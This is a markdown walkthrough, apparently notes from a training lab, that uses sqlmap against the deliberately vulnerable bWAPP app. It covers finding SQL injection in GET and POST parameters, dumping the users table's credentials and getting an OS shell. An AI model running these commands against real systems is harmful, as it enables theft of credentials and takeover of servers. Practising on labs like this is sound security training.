# SQL Injection

## GET Request

### Search

![1.1](./imgs/1.1.png)

-u=URL<br>
--cookie=COOKIE_FROM_BURP_SUITE<br>
-p=TARGET_PARAMETER
```
sqlmap -u "http://demo.ine.local/sqli_1.php?title=batman&action=search" --cookie="PHPSESSID=u84o0m5b6knt1ksrpj365a6f31; security_level=0" -p title
```

![1.2](./imgs/1.2.png)

SQL syntax error means that it is vulnerable to SQLi
![1.3](./imgs/1.3.png)

--dbs=GET_DATABASES
```
sqlmap -u "http://demo.ine.local/sqli_1.php?title=batman&action=search" --cookie="PHPSESSID=u84o0m5b6knt1ksrpj365a6f31; security_level=0" -p title --dbs
```

![1.4](./imgs/1.4.png)

-D=DATABASE<br>
--tables=GET_TABLES
```
sqlmap -u "http://demo.ine.local/sqli_1.php?title=batman&action=search" --cookie="PHPSESSID=u84o0m5b6knt1ksrpj365a6f31; security_level=0" -p title --dbs -D bWAPP --tables
```

![1.5](./imgs/1.5.png)
-T=TABLE<br>
--columns=GET_TABLE_COLUMNS
```
sqlmap -u "http://demo.ine.local/sqli_1.php?title=batman&action=search" --cookie="PHPSESSID=u84o0m5b6knt1ksrpj365a6f31; security_level=0" -p title --dbs -D bWAPP --tables -T users --columns
```

![1.6](./imgs/1.6.png)

-C=COLUMNS<br>
--dump=SHOW_DATA
```
sqlmap -u "http://demo.ine.local/sqli_1.php?title=batman&action=search" --cookie="PHPSESSID=u84o0m5b6knt1ksrpj365a6f31; security_level=0" -p title --dbs -D bWAPP --tables -T users -C admin,password,email --dump
```

![1.7](./imgs/1.7.png)

### Select

![3.1](./imgs/3.1.png)

```
sqlmap -u "http://demo.ine.local/sqli_2.php?movie=10&action=go" -p movie --cookie="PHPSESSID=v0auu4dm3tt1rt46kj1ftigjj3; security_level=0"
```

![3.2](./imgs/3.2.png)

SQL syntax error means that it is vulnerable to SQLi
![3.3](./imgs/3.3.png)

```
sqlmap -u "http://demo.ine.local/sqli_2.php?movie=10&action=go" -p movie --cookie="PHPSESSID=v0auu4dm3tt1rt46kj1ftigjj3; security_level=0" --dbs
```

![3.4](./imgs/3.4.png)

```
sqlmap -u "http://demo.ine.local/sqli_2.php?movie=10&action=go" -p movie --cookie="PHPSESSID=v0auu4dm3tt1rt46kj1ftigjj3; security_level=0" --dbs -D bWAPP --tables
```

![3.5](./imgs/3.5.png)

```
sqlmap -u "http://demo.ine.local/sqli_2.php?movie=10&action=go" -p movie --cookie="PHPSESSID=v0auu4dm3tt1rt46kj1ftigjj3; security_level=0" --dbs -D bWAPP --tables -T users --columns
```

![3.6](./imgs/3.6.png)

```
sqlmap -u "http://demo.ine.local/sqli_2.php?movie=10&action=go" -p movie --cookie="PHPSESSID=v0auu4dm3tt1rt46kj1ftigjj3; security_level=0" --dbs -D bWAPP --tables -T users -C admin,email,password --dump
```

![3.7](./imgs/3.7.png)

## POST Request

### Search

Save POST request to file
![4.1](./imgs/2.1.png)

```
sqlmap -r request -p title
```
![4.2](./imgs/2.2.png)

SQL syntax error means that it is vulnerable to SQLi
![4.3](./imgs/2.3.png)

Get a shell using SQLMap<br>
```
sqlmap -r request -p title -os-shell
```
![4.4](./imgs/2.4.png)

### Select
Save POST request to file
![2.1](./imgs/2.1.png)

-r=FILE_NAME
```
sqlmap -r request -p title
```
![2.2](./imgs/2.2.png)

SQL syntax error means that it is vulnerable to SQLi
![2.3](./imgs/2.3.png)

Get a shell using SQLMap<br>
--os-shell=GET_SHELL
```
sqlmap -r request -p title -os-shell
```
![2.4](./imgs/2.4.png)



